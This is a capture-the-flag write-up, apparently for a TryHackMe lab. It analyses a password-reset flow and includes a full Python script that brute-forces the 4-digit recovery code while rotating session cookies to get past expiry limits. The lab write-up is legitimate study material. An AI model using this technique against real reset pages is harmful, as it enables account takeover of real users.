# Brute forcing 4-digit code

### Overview of password recovery process

**(1)** Enter email in the **Reset Password** page

POST `/reset_password.php` (email=tester%40hammer.thm)

> NOTE: this request must be performed before attempting to POST the recovery code (see next step)&#x20;

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Response**

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**(2)** A `GET /reset_password.php` request will be sent.&#x20;

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

If the cookie is valid (not expired), we will be presented with a form to enter the 4-digit recovery code.

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**(3)** Enter recovery code

POST `/reset_password.php` with recovery code and **s** parameter defined in the request body.

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

A script exist that automatically logs the user out after a set period of time. The value `countdownv` is used as the time variable, which appears to be controlled by the **s** parameter in our request body:

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

**Response**

If we send an expired cookie, we will get the following response:

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

If the cookie is not expired, we will be able to send our recovery code. The image below shows the display for an invalid recovery code.

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

**(4)** Once the window period is over (`countdownv <=0`), the cookie will be expired, and the user will be automatically logged out.

Automatic logout: `GET /logout.php`

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

This will cause the application to expire our cookie.

**Response**

Set-Cookie to `PHPSESSID=deleted`.

<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption><p>RESPONSE</p></figcaption></figure>

**(5)** From the `Location` header defined in the previous response, a `GET /index.php` request with no cookies will be sent, to redirect back to the main login page.

`GET /index.php`&#x20;

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption><p>REQUEST</p></figcaption></figure>

**Response**

New `PHPSESSID` in the Set-Cookie

* Retrieved `PHPSESSID: mgj0vc1q4908nel9i695d3mvj8`&#x20;
* This value will be sent as a cookie in the subsequent requests

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption><p>RESPONSE</p></figcaption></figure>



**(6)** The entire process repeats from step **(1)** above, with the newly retrieved cookie.&#x20;

### Findings

1. We can control the time period window in the reset password page (/reset\_password.php) with the **s** parameter. However, this simply prevents the application from immediately expiring our cookie  (`GET /logout.php`), but does not work itself when brute forcing.
2. It appears that the application has an internal clock which controls the expiration of the cookie. Thus, even if we were to utilize the method in part 1, the application will reject our request. To workaround this, we have to programmatically send a request: `GET /index.php`, with no cookies, to retrieve a fresh cookie from the application (refer to part 5 in the overview section above).



```python
import requests


N = 8
MAX_CODE = 9999
IP = '10.10.187.29'
PORT = 1337
URL = f'http://{IP}:{PORT}'
EMAIL = 'tester@hammer.thm'

headers = {
    'Host': f'{IP}{PORT}',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0'
}


def retrieve_new_session():
    with requests.Session() as s:
        # session is updated automatically
        s.get(f'{URL}/index.php', headers=headers)

    return s


def enter_email(s):
    data = {
        'email': EMAIL
    }

    s.post(f'{URL}/reset_password.php',
           headers=headers, data=data)


def logout(s):
    # GET /logout.php
    s.get(f'{URL}/logout.php',
          headers={**headers,
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Referer': 'http://10.10.187.29:1337/reset_password.php'})


def brute_force():

    try:

        # retrieve initial session
        s = retrieve_new_session()

        # enter email
        enter_email(s)

        iterations = MAX_CODE+1

        for i in range(iterations):

            if i % N == 0 and i != 0:
                print('[INFO] Retrieving new PHPSESSID')

                # # reset PHPSESSID
                # logout(s)

                # request for a new PHPSESSID
                s = retrieve_new_session()

                # enter email
                enter_email(s)

            code = f'{i:04d}'

            data = {
                'recovery_code': code,
                's': 200
            }

            print(f'[INFO] Trying code={code}')

            res = s.post(f'{URL}/reset_password.php',
                         headers=headers, data=data)

            res_text = res.text
            res_status_code = res.status_code
            res_content_length = len(res.text)
            req_cookies = s.cookies.get_dict()

            # print(res_text)

            print(f'[INFO] status={res_status_code} content_length={
                res_content_length} cookies={req_cookies}')

            # wrong code
            if 'Invalid or expired recovery code!' in res_text:
                print('[INFO] Wrong code!')

            # valid code found
            else:
                print('[INFO] Success!')
                print(f'code={code}')
                exit()

    except KeyboardInterrupt:
        exit()


brute_force()

```

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
